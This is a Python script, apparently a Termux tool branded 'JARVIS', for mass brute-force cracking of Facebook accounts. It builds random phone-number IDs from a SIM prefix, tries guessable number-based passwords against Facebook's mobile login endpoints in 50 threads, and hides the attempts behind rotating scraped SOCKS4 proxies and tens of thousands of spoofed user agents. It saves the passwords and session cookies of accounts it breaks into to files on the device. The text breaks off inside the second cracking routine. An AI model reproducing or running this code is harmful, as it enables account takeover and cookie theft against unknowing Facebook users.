import os
import time
try:os.mkdir('/sdcard/JARV1S')
except:pass
os.system('clear')
print('\n\033[1;92m cloniing krna apradh he....')
time.sleep(0.8)
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('clear')
print('\n\033[1;97m checking module..!')
time.sleep(0.5)
try:
	import requests
except ImportError:
	print('\n [\033[1;91mX\033[1;97m] module is not installed correctly!...\n')
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
else:
	print('\n[\033[1;92m✓\033[1;97m] module was installed correctly')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,uuid
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
fb=[]
#os.system("git pull")
#os.system("pkg reinstall python")
#os.system('pkg install curl')
try:
		prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
		open('.proxy.txt','w').write(prox)
except Exception as e:
		exit(e)
ugen=[]
uge=[]
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
		fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
		total = 0
		for i in fbcr:
				total+=1
		select = ('1','2')
		if select == '1':
				fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
				sim_id+=fbcr
		elif select == '2':
				try:
						fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
						sim_id+=fbcr
				except Exception as e:
						fbcr = "Zong"
						sim_id+=fbcr
		else:
				fbcr = 'Zong'
				sim_id+=fbcr
except:
		fbcr = "Zong"
device = {
		'android_version':android_version,
		'model':model,
		'build':build,
		'fblc':fblc,
		'fbmf':fbmf,
		'fbbd':fbbd,
		'fbdv':model,
		'fbsv':fbsv,
		'fbca':fbca,
		'fbdm':fbdm}

build = device['build']
model = device['model'] 
ex = device['fbdm']
android_version = device['android_version']+'.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111,7777777)}"
versi_android = f"{random.randint(4,13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
#Mozilla/5.0 (Linux; U; Android 11; 10; fr-fr; Redmi Note 11 Build/G545S) AppleWebKit/537.36 (KHTML, like Gecko) Version/97.0.4822.91  Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
for xd in range(50000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
	c=f''+model+' Build/'+build+''
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	uge.append(uaku2)
	
#c=f''+model+' Build/'+build+''
for xg in range(60000):
	xf = f"[FBAN/Orca-Android;FBAV/"+facebook_version+";FBPN/com.facebook.orca;FBLC/en_IN;FBBV/"+bv+";FBCR/Jio;FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2340};FB_FW/1"
	fb.append(xf)
redmi=[]
jrvis=[]
agnt=[]
kk=[]
usr=[]
c = ('Mozilla/5.0 (Linux; Android 12; Infinix X6823 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]','Mozilla/5.0 (Linux; Android 11; Infinix X689D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; CPH2343) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.2.1 Chrome/108.0.5359.128 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; CPH2343 Build/SKQ1.211209.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 12; RMX3350 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; RMX3612 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]','Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; V2132) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; V2132 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Mozilla/5.0 (Linux; Android 12; 2201117TG Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 12; 2201117TY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.61 Mobile Safari/537.36')
try:
	xd=requests.get('https://raw.githubusercontent.com/Jarvis-070/Random/main/ugenn.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
ugn=[]
ugnn=[]
realme = random.choice(['M910x','D10i','2PXH3','D830x','U-2u','M910x','2PXH3','HTC_Desire_S_S510e','HTC_0P3P5','HTC_DesireHD_X315e','HTC_C715c','HTC_D616w'])
#Mozilla/5.0 (Linux; Android 6; SM-G781) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5215.119 Mobile Safari/537.36'
for Xr in range (99999):    
    a='Mozilla/5.0 (Linux; Android'
    b=random.randrange(6, 12)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Mobile Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a} {b}; {realme} {d}{e}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugnn.append(uaku)

for Xr in range (50000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(5, 12)
	c=random.randrange(3, 13)
	d='K'
	e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D","IML74K","GRJ22","JDQ39"])
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(73,112)
	h='0'
	i=random.randrange(4200,4900)
	j=random.randrange(40,150)
	k='Mobile Safari/537.36'
	l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
	#l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
	m=random.randrange(1,9)
	n=random.randrange(1,9)
	o='0'
	p=random.randrange(5,20)
	uaku=(f'{a} {b}; {d}) {f}{g}.{h}.{i}.{j} {k}') #{l} #/{m}.{n}.{o}.{p}')
	ugn.append(uaku)
for xd in range(50000):
	rr = random.randint; rc = random.choice
	gt = ['M2105K81AC','2106118C','M2103K19I','M2012K10C','M2103K19PI','M2012K11AI','M2004J19PI','M2012K11G','M2101K9C','M2101K9G','M2101K7BNY','M2012K11AG','M2102J2SC','M2010J19SR','M2011K2C','23049RAD8C','23030RAC7Y','23021RAAEI','23021RAAEG','23028RA60L','23021RAA2Y','23028RN4DH','23026RN54G','22127PC95I','2210129SG','22120RN86H','22126RN91Y','22120RN86I','23013RK75C','23013PC75I','22127RK46C','2211133C','22111317G','22101316G','22101316UCP','22081283G','22041219I','Neffos_C9','ASUS_X00TD']
	strvgt = f"Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
	uateddy = random.choice([strvgt])
	jrvis.append(uateddy)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
logo = ("""
	\033[1;97m
  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
              \x1b[1;91m—————— \x1b[1;97m[<MAIN4K - TEST>] \x1b[1;91m——————
\033[1;97m———————————————————————————————————————————————""")
loop = 0
oks = []
cps = []
lcs = []
myid=uuid.uuid4().hex[:5].upper()
def __iam_a_porche():
	os.system('clear')
	print(logo)
	print('\033[1;92mChecking Subscription ....\033[0;97m')
	try:
		httpCaht = requests.get('https://github.com/Jarvis-070/approval-/blob/main/approval.txt').text
		t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
		t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
		uid = os.getuid()
		kex=(f"BCC-{uid}TS{t1}")
		gen_token=(f"{kex}")
		fkeyx = gen_token.replace("b'","").replace("'","")
		if fkeyx in httpCaht:
			method()
		else:
			os.system('clear')
			print(logo)
			print('Your Key: '+fkeyx)
			print(47*"—") 
			print('This was a personal tool')
			print(47*"—") 
	except Exception as e:
		#print(e)
		print('\n\033[1;31m error..\033[0;97m')
		
def pasuu():
	os.system('clear')
	print(logo)
	y = print("enter tool password")
	print(47*"—") 
	x = input ("put pass: ")
	if x in ("EF18T"):
		print(47*"—") 
		print("Checking...")
		time.sleep(0.9)
		print(47*"—") 
		print("\r\033[1;32mAccess Granted")
		time.sleep(0.8)
		method()
	else:
		print(47*"—") 
		print("Checking...")
		time.sleep(0.9)
		print(47*"—") 
		print("\x1b[1;91mAccess Denied")
		time.sleep(0.8)
		exit()


def menu():
	os.system('clear')
	print(logo)
	print('[1] Start Random Crack')
	print('[0] Exit')
	print(47*"—") 
	opt = input('[?] Choose : ')
	if opt =='1':
		method1()
	elif opt =='0':
		exit()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		menu()
		
def method():
	os.system('clear')
	print(logo)
	print(f'{Y}[{W}1{Y}] {W}METHOD 1 [\x1b[1;92m Updated \x1b[1;97m] ')
	print(f'{Y}[{W}2{Y}] {W}METHOD 2 [\x1b[1;93m Chumda Hua \x1b[1;97m] ')
	print(f'{Y}[{W}3{Y}] {W}METHOD 3 [\x1b[1;94m Orbhi Chumda Hua \x1b[1;97m] ')
	print(f'{Y}[{W}0{Y}] {W}EXIT')
	print(47*"—") 
	opt = input(f'{Y}[{W}!{Y}] {W}Choose : ')
	if opt =='1':
		method1()
	elif opt =='2':
		method2()
	elif opt =='3':
		method3()
	elif opt =='0':
		exit()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		method()
def check_frnds(coki):
	#print(coki)
	try:
		a = requests.get('https://mbasic.facebook.com/profile.php?v=friends',cookies={'cookie':coki}).text.replace("amp;","")
	except:
		pass
def cek_apkk(session,coki):
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r {Y}[{G}!{G}{Y}] {G}Sorry No Active Apps Found")
	else:
		print(f"\r {Y}[{G}•{G}{Y}] {W}Active Apps Or Websites")
		for i in range(len(game)):
			print(f" \r%s {Y}[{G}%s{G}{Y}] %s %s"%( G, i+1, game[i].replace("Ditambahkan pada"," Ditambahkan pada"),G))
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r {Y}[{R}!{R}{Y}] {R}Sorry No Expired Apps Found")
	else:
		print(f"\r {Y}[{R}•{R}{Y}] {W}Expired Apps or Website")
		for i in range(len(game)):
			print(f" \r%s {Y}[{R}%s{R}{Y}] %s %s"%( B, i+1, game[i].replace("Kedaluwarsa"," Kedaluwarsa"),B))
def cek_apk(session,coki):
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
			pass
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
			pass

def method1():
	user=[]
	os.system('clear')
	print(logo)
	print(f'{Y}[{W}•{Y}] {W}Type Any 4digit Sim Code (e.g- 8101,8927)')
	print(47*"—") 
	kode = input(f'{Y}[{W}?{Y}] {W}Input Code : ')
	print(47*"—") 
	limit = int(input(f'{Y}[{W}?{Y}] {W}How Many Numbers Do You Want To Add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;97m[\x1b[1;91m✓\x1b[1;97m]\x1b[1;97m Total Idz: '+tl+' \x1b[1;97m>\x1b[1;91m>\x1b[1;97m>\x1b[1;97m Choice Code: '+kode)
		print(47*"\x1b[1;97m—") 
		for guru in user:
			uid = kode+guru
			mk = uid[:6]
			xx = uid[:7]
			v = uid[:8]
			b = guru[:6]
			pwx = [mk,b,'57273200',v]
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	method()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global jrvis
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM-1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
			sys.stdout.flush()
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			moz = random.choice(uge)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    'try_number': '0',
    'unrecognized_tries': '0',
    'flow': 'login_no_pin',
    'next': 'https://m.facebook.com/login/save-device/',
    'uid': uid,
    'pass': ps,
   '__dyn': '', '__csr': '', '__req': 'm', '__fmt': '1', '__a': '',  '__user': '0'}
			header_freefb = {'Host': 'm.facebook.com',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-platform': '"Android"',
'sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
'sec-ch-ua-model': '""',
'x-response-format': 'JSONStream',
'sec-ch-ua-mobile': '?1',
'x-asbd-id': '129477',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
'x-requested-with': 'XMLHttpRequest',
'sec-ch-prefers-color-scheme': 'dark',
'user-agent': moz,
'content-type': 'application/x-www-form-urlencoded',
'sec-ch-ua-platform-version': '""',
'accept': '*/*',
'origin': 'https://m.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1729312423632%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe059b7bd7de4749f%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff559b3a415fff8eb1%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Df63fc087abba23865%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfeb2eaf114a860c27%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff559b3a415fff8eb1%2526relation%253Dopener%2526frame%253Dfb4a8272962b3a5f4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv19.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfeb2eaf114a860c27%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff559b3a415fff8eb1%26relation%3Dopener%26frame%3Dfb4a8272962b3a5f4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br, zstd',
'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8',
'priority': 'u=1, i',}
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?api_key=957549474255294&auth_token=48154ecedb174fa6d697714afda59ef9&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1729312423632%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe059b7bd7de4749f%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff559b3a415fff8eb1%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Df63fc087abba23865%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfeb2eaf114a860c27%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff559b3a415fff8eb1%2526relation%253Dopener%2526frame%253Dfb4a8272962b3a5f4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv19.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=957549474255294&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfeb2eaf114a860c27%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff559b3a415fff8eb1%26relation%3Dopener%26frame%3Dfb4a8272962b3a5f4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=log_data,headers=header_freefb,proxies=proxs,allow_redirects=False).text
			#print(log_data)
			#print(header_freefb)
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cooki = f"sb={ssbb};{coki}"
				user = re.findall('c_user=(.*);fr', coki)[0]
				cek_apk(session,coki)
				oks.append(user) 
				open('/sdcard/JARV1S/jrvis-m1-cookies.txt', 'a').write(user+'|'+ps+'|'+coki+'\n')
				print('\033[1;92m [JARVIS-OK] '+user+' | '+ps)
				print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+coki)
				#cek_apkk(session,coki)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				user = re.findall('c_user=(.*);fr', coki)[0]
				print('\033[1;92m [JARVIS-CP] '+user+' | '+ps)
				open('/sdcard/ARYAN-CP.txt', 'a').write( user+' | '+ps+' \n')
				cps.append(cid)
				break		
			else:
				continue
		loop+=1
		#sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM-1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
		#sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

def method2():
	user=[]
	os.system('clear');print(logo)
	print(f'{Y}[{W}•{Y}] {W}Type Any 4digit Sim Code (exp- 8101,8927)')
	print(47*"—") 
	kode = input(f'{Y}[{W}?{Y}] {W}Input Code : ')
	print(47*"—") 
	limit = int(input(f'{Y}[{W}?{Y}] {W}How Many Numbers Do You Want To Add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[1;97m[\x1b[1;91m✓\x1b[1;97m]\x1b[1;97m Total Idz: '+tl+' \x1b[1;97m>\x1b[1;91m>\x1b[1;97m>\x1b[1;97m Choice Code: '+kode)
		print(47*"\x1b[1;97m—") 
		for guru in user:
			uid = kode+guru
			mk = uid[:6]
			xx = uid[:7]
			v = uid[:8]
			b = guru[:6]
			pwx = [mk,v,uid]
			yaari.submit(bcrack,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	print(47*"—") 
	input('Press Enter To Go Back To Menu')
	method()
	
def bcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global lcs
	global jrvis
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM-2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
			sys.stdout.flush()
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			moz = random.choice(ugn)
			facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
			bv = f"{random.randint(1111111,7777777)}"
			versi_android = f"{random.randint(4,13)}"
			device = random.choice(['M910x','D10i','2PXH3','D830x','U-2u','M910x','2PXH3'])
			#device = random.choice(['V2183A','I2223','V2307','V2314','I2217','V2239'])
			#device = random.choice(['SM-A515F','SM-A235F','SM-A525F','SM-A715F','SM-G996B','SM-A705F','SM-A315F'])
			us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_IN;FBBV/"+bv+";FBCR/Jio;FBMF/HTC;FBBD/HTC;FBDV/"+device+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=1920};FB_FW/1"
			ua= f"Dalvik/2.1.0 (Linux; U; Android "+versi_android+"; HTC 2Q6E1 Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) [FBAN/Orca-Android;FBAV/"+facebook_version+";FBPN/com.facebook.orca;FBLC/en_IN;FBBV/"+bv+";FBCR/Jio;FBMF/HTC;FBBD/HTC;FBDV/2Q6E1;FBSV/"+versi_android+";FBCA/armeabi-v8.2a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;] FBBK/1"
			free_fb = session.get("https://x.facebook.com/login.php?skip_api_login=1&api_key=452874865123152&kid_directed_site=0&app_id=452874865123152&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D452874865123152%26redirect_uri%3Dhttps%253A%252F%252Fgraphql.production.looka.com%252Foauth%252Ffacebook%252Fcallback%26scope%3Demail%2Bpublic_profile%26state%3D%257B%2522AppID%2522%253A%2522looka%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6eed2155-3899-412b-9834-6ea041fb9a21%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fgraphql.production.looka.com%2Foauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522AppID%2522%253A%2522looka%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0&zero_e=1&zero_et=1708656362&_rdc=1&_rdr&refsrc=deprecated").text
